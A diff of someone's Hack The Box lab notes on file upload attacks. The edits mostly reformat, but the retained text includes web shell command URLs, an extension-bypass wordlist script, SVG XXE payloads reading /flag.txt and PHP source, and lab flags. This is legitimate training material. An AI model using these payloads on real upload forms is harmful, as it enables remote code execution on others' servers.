@@ -41,9 +41,6 @@
     [!] Answer: "fileuploadsabsentverification"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [Upload Exploitation]
 
 [*] Target: 209.97.131.137:32596
@@ -61,14 +58,12 @@
     [!] Answer: "HTB{g07_my_f1r57_w3b_5h3ll}"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [Client-Side Validation]
 
 [*] Target: 144.126.230.157:30069
 
-[Question 1] Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)
+[Question 1] Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt 
+             (try both bypass methods for better practice)
 
 [Step 1] Create our payload
  
@@ -93,7 +88,9 @@
 
         => http://209.97.131.137:32287/profile_images/malware_1.php?cmd=cat%20/flag.txt => HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
 
-        (Note: You are thinking "How can I know the directory that stores the payload" => "<img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>")
+        (Note: You are thinking "How can I know the directory that stores the payload" 
+        
+        => "<img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>")
     
 
     [2nd Way] Upload a real image and change its content using Burpsuite
@@ -149,9 +146,6 @@
     [!] Answer: "HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [Blacklist Filters]
 
 [*] Target: 178.62.9.40:30218
@@ -168,7 +162,7 @@
 
         for main_exten in 'jpg' 'png' 'gif'; do
             for char in '%20' '%0a' '%00' '%0d0a' '\x00' '%09' '/' '.\\' '.' '…' ':' '#'; do
-                for ext in 'php' 'phps' 'php3' 'php4' 'php5' 'php7' 'php8' 'phar' 'phtml' 'phtm' 'pHtml' 'pHp' 'pHp3' 'pHp4' 'pHp5' 'phpt' 'htaccess' 'shtml' 'hphp' 'inc'; do
+                for ext in 'php' 'phps' 'php3' 'php4' 'php5' 'php7' 'php8' 'phar' 'phtml' 'phtml'; do
                     echo "$char.$ext.$main_exten" >> Bypass_extension.txt
                     echo ".$ext$char.$main_exten" >> Bypass_extension.txt
                     echo ".$main_exten$char.$ext" >> Bypass_extension.txt
@@ -217,9 +211,6 @@
     => http://134.122.99.24:31938/profile_images/CBBH.phar => HTB{1_c4n_n3v3r_b3_bl4ckl1573d} 
 
     [!] Answer: "HTB{1_c4n_n3v3r_b3_bl4ckl1573d}"
-
-
-************************************************************************************************************************************************************************************************************************************************************
 
 
 [Whitelist Filters]
@@ -281,9 +272,6 @@
     [!] Answer: "HTB{1_wh173l157_my53lf}"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [Type Filters]
 
 [*] Target: 165.232.110.46:30371
@@ -340,18 +328,17 @@
     [!] Answer: "HTB{m461c4l_c0n73n7_3xpl0174710n}"
 
 
-************************************************************************************************************************************************************************************************************************************************************
-
-
 [Limited File Uploads]
 
 [*] Target: 178.62.76.153:30154
 
-[Question 1] The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
+[Question 1] The above exercise contains an upload functionality that should be secure against arbitrary file uploads. 
+             Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
 
     - As you already know SVG is an XML-based format that describes two-dimensional vector graphics using a set of drawing instructions and shapes.
 
-    => When you go to http://178.62.76.153:30154/ , you will see the HTB logo. Of course, you can upload to change the logo (https://upload.wikimedia.org/wikipedia/commons/b/b0/NewTux.svg)
+    => When you go to http://178.62.76.153:30154/ , you will see the HTB logo. 
+       Of course, you can upload to change the logo (https://upload.wikimedia.org/wikipedia/commons/b/b0/NewTux.svg)
 
     => As you can see, it's the mathematic stuff, I don't understand, but I know the backend executes these XML codes to show us the image
 
@@ -361,7 +348,8 @@
         <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
         <svg>&xxe;</svg>
 
-    => This website accepts svg so, just upload it normally, and remember "Do not change the Content-Type and Extension of svg file event when trying to bypass"
+    => This website accepts svg so, just upload it normally, and remember 
+       "Do not change the Content-Type and Extension of svg file event when trying to bypass"
         
         POST /upload.php HTTP/1.1
         Host: 178.62.76.153:30154
@@ -397,15 +385,18 @@
 
     [!] Answer: "HTB{my_1m4635_4r3_l37h4l}"
 
-[Question 2]  Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
+[Question 2]  Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. 
+              (write it exactly as found in the source, without quotes)
 
-    - Now we have the mindset from the previous question, but this time, I need to read the upload.php's source code, so the payload must be a little bit different
+    - Now we have the mindset from the previous question, but this time, I need to read the upload.php's source code, 
+      so the payload must be a little bit different
 
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE svg [ <!ENTITY thinhdeptraiprovip SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
     <svg>&thinhdeptraiprovip;</svg>
 
-    [?] 'php://filter' stream allows you to apply filters to the resource being accessed, in this case, converting it to Base64. This is a trick to transfer things much more easier
+    [?] 'php://filter' stream allows you to apply filters to the resource being accessed, in this case, converting it to Base64. 
+        This is a trick to transfer things much more easier
 
     -> After uploaded the payload you will retrive this => 'PD9waHAK...b2FkIjsKfQo=' which can be decode to
 
@@ -429,9 +420,6 @@
             echo "File failed to upload";}
 
     [!] Answer: "./images/"
-
-
-************************************************************************************************************************************************************************************************************************************************************
 
 
 [Skills Assessment - File Upload Attacks]
@@ -579,7 +567,8 @@
             } else {
                 echo "File failed to upload";}
 
-        => Now we know that our files are stored as 230527_Exploit_Img.[extensions] in the /user_feedback_submissions. We need to fuzz the file extension to know what is the available one
+        => Now we know that our files are stored as 230527_Exploit_Img.[extensions] in the /user_feedback_submissions. 
+           We need to fuzz the file extension to know what is the available one
 
             GET /contact/user_feedback_submissions/230527_Exploit_Img§.jpg§?cmd=whoami HTTP/1.1
             Host: 178.62.76.153:32754
@@ -590,11 +579,17 @@
             Connection: close
             Upgrade-Insecure-Requests: 1
 
-        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=whoami => www.data
+        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=whoami 
+            
+           => www.data
 
-        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=ls / => ... flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=ls / 
+            
+            => ... flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
 
-        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt => HTB{m4573r1ng_upl04d_3xpl0174710n}
+        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt 
+        
+            => HTB{m4573r1ng_upl04d_3xpl0174710n}
 
     [!] Answer: "HTB{m4573r1ng_upl04d_3xpl0174710n}"
 
